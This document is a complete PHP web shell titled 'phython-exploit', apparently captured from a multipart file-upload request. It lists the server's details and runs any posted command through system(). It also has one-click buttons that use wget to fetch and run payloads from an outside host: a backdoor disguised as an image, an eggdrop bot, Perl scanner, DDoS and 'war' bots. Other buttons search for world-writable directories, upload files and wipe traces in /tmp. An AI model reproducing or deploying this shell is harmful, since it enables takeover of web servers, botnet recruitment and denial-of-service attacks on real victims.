<title>phython-exploit</title>
<body text="lightgreen" bgcolor="black">
<font face="Verdana" color="yellow" size="2">
<p align="center"><font face="AF PEPSI" size="3" color="#FF0000"><blink>-== Created By ReNdY ==-</blink></font></div>
<font face="courier new" size="1" color="#00FF00"><b><center><h1><marquee>-=- Never Fucking Die -=-</marquee></h1></center></b></font></body>
</p>

<hr><hr>
<div align="left"><b><?php
  closelog( );
  $sh_id = "cGh5dGhvbg==";
  $sh_ver = "- exploit";
  $sh_name = base64_decode($sh_id).$sh_ver;
  $user = get_current_user( );
  $login = posix_getuid( );
  $euid = posix_geteuid( );
  $ver = phpversion( );
  $gid = posix_getgid( );
  if ($chdir == "") $chdir = getcwd( );
  if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php
  $uname = posix_uname( );
  while (list($info, $value) = each ($uname)) {
?>
  <TR>

  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b><span style="font-size: 9pt"><?= $info ?>
    <span style="font-size: 9pt">:</b> <?= $value ?></span></DIV></TD>
  </TR>
<?php
  }
?>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>(<?= $whoami?>) gid=<?= 

$gid ?>(<?= $whoami?>)</span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Current Path:</b> <?= $chdir ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?>
    </span></DIV></TD>
  </TR>  
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?>
    </span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Server Address:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
    </span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Script Current User:</b> <?= $user ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">PHP Version:</b> <?= $ver ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Perl:</b> <? if(exec("perl -V")){ echo "ON"; }else{ echo "OFF"; } ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Wget:</b> <? if(exec("wget --help")){ echo "ON"; }else{ echo "OFF"; } ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Curl:</b> <? if(exec("curl --help")){ echo "ON"; }else{ echo "OFF"; } ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Fetch:</b> <? if(exec("fetch --help")){ echo "ON"; }else{ echo "OFF"; } ?></span></DIV></TD>
  </TR>
</TABLE>
</b>
</div></font></div>
<?php
set_magic_quotes_runtime(0);
$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);
$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;
if( $currentWD == "" ) {
    $currentWD = $SCWD;
}
if( $_POST['_act'] == "List!!!" ) {
    $currentCMD = "ls -la";
}
if( $_POST['_act'] == "IP" ) {
    $currentCMD = "/sbin/ifconfig|grep inet";
}
if( $_POST['_act'] == "Proc" ) {
    $currentCMD = "ps x";
}
if( $_POST['_act'] == "Memory" ) {
    $currentCMD = "free";
}
if( $_POST['_act'] == "777" ) {
    $currentCMD = "find . -type d -perm -2 -ls";
}
if( $_POST['_act'] == "nobody" ) {
    $currentCMD = "find / -user nobody -type d";
}
if( $_POST['_act'] == "apache" ) {
    $currentCMD = "find / -user apache -type d";
}
if( $_POST['_act'] == "httpd" ) {
    $currentCMD = "find / -user httpd -type d";
}
if( $_POST['_act'] == "w" ) {
    $currentCMD = "find / -user www -type d";
}
if( $_POST['_act'] == "w-d" ) {
    $currentCMD = "find / -user www-data -type d";
}
if( $_POST['_act'] == "Port" ) {
    $currentCMD = "netstat -an";
}
if( $_POST['_act'] == "Psy" ) {
    $currentCMD = "wget http://youregypt.com/files/e.tar.gz;tar -zxvf *.gz;rm -rf *.gz*";
}
if( $_POST['_act'] == "Shell" ) {
    $currentCMD = "wget http://youregypt.com/files/c.gif;mv c.gif contents.php;chmod 755 contents.php;ls -la";
}
if( $_POST['_act'] == "Egg" ) {
    $currentCMD = "wget http://youregypt.com/files/as.tar.gz;tar -zxvf as.tar.gz;rm -rf as.tar.gz";
}
if( $_POST['_act'] == "Scanner" ) {
    $currentCMD = "cd /tmp;wget http://youregypt.com/amr/os1.txt;perl os1.txt";
}
if( $_POST['_act'] == "Ddos" ) {
    $currentCMD = "wget http://youregypt.com/ad/on.jpg;mv on.jpg logo.php";
}
if( $_POST['_act'] == "War" ) {
    $currentCMD = "cd /tmp;wget http://youregypt.com/files/net;perl net";
}
if( $_POST['_act'] == "Cleaner" ) {
    $currentCMD = "cd /tmp;rm -rf *.txt;rm -rf *.txt*;rm -rf *.pl;rm -rf *.pl*;rm -rf *.png;rm -rf *.png*;rm -rf *.jpg;rm -rf *.jpg*";
}
if( $_POST['_act'] == "Suicide" ) {
    $currentCMD = "pkill perl;killall -9 perl;killall -9 httpd";
}
print "<form method=post enctype=\"multipart/form-data\"><hr><hr><table>";
print "<tr><td><b>Execute Command:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Execute!!!\"> <input type=submit name=_act value=\"Psy\"></td></tr>";
print "<tr><td><b>Change Directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List!!!\"></td></tr>";
print "<tr><td><b>Upload file:</b></td><td><input size=87 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!!!\"></td></tr>";
print "<tr><td><b>Find:</b></td>";
print "<td><input type=submit name=_act value=\"IP\"><b> <b><input type=submit name=_act value=\"Port\"><b> <b><input type=submit name=_act value=\"Proc\"><b> <b><input type=submit name=_act value=\"Memory\"><b> <b><input type=submit name=_act value=\"777\"><b> <b><input type=submit name=_act value=\"nobody\"><b> <b><input type=submit name=_act value=\"apache\"><b> <b><input type=submit name=_act value=\"httpd\"><b> <b><input type=submit name=_act value=\"w\"><b> <b><input type=submit name=_act value=\"w-d\"></td></tr>";
print "<tr><td><b>Magic:</b></td>";
print "<td><input type=submit name=_act value=\"Shell\"><b> <b><input type=submit name=_act value=\"Egg\"><b> <b><input type=submit name=_act value=\"Scanner\"><b> <b><input type=submit name=_act value=\"Ddos\"><b> <b><input type=submit name=_act value=\"War\"><b> <b><input type=submit name=_act value=\"Cleaner\"><b> <b><input type=submit name=_act value=\"Suicide\"><b> <b><input type=submit name=_act value=\"Help\"><b>";
print "</table></form><hr><hr>";
$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);
if( $_POST['_act'] == "Help" ) {
print "<table>";
print "<tr><td>Command -= Available help for this injector =-</td></tr>";
print "<tr><td>Command Fucked = To run command.</td></tr>";
print "<tr><td>Command Psy = To load psy input port on Fucked column.</td></tr>";
print "<tr><td>Command List = To view file on current folder.</td></tr>";
print "<tr><td>Command Upload = To upload files.</td></tr>";
print "<tr><td>Command IP = To check available IP.</td></tr>";
print "<tr><td>Command Port = To check all open ports.</td></tr>";
print "<tr><td>Command Proc = To view all process.</td></tr>";
print "<tr><td>Command Memory = To view available memory.</td></tr>";
print "<tr><td>Command 777 = To find all writable folder in current directory.</td></tr>";
print "<tr><td>Command nobody = To find user nobody.</td></tr>";
print "<tr><td>Command apache = To find user apache.</td></tr>";
print "<tr><td>Command httpd = To find user httpd.</td></tr>";
print "<tr><td>Command w = To find user www.</td></tr>";
print "<tr><td>Command w-d = To find user www-data.</td></tr>";
print "<tr><td>Command Shell = To install BD.</td></tr>";
print "<tr><td>Command Egg = To load eggdrop bot</td></tr>";
print "<tr><td>Command Scanner = To load perl botscanner.</td></tr>";
print "<tr><td>Command Ddos = To load perl bot DDOS.</td></tr>";
print "<tr><td>Command War = To load perl botwar.</td></tr>";
print "<tr><td>Command Cleaner = To clean loaded perl script on /tmp.</td></tr>";
print "<tr><td>Command Suicide = Bunuh diri,jiakakakakakkkkk......</td></tr>";
print "</table></form><hr><hr>";
}
if( $_POST['_act'] == "Upload!!!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Error Upload.....!!!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>Upload Suckses.....!!!</b></center>";
    }    
} else {
    print "\n\n<!-- Output nongol dari sini -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
  system("$currentCMD 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm 
/tmp/cmdtemp");
    print "\n</pre>\n<!-- Berakhir di sini -->\n\n</center><hr><hr><center><b>Re-Coding by Phython</b></center>";
}
exit;
?>
</body>
------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file2"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file3"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file4"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file5"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file6"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file7"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="m"

Upload
------------zeapd18zIuY8XRUc8h5yOl--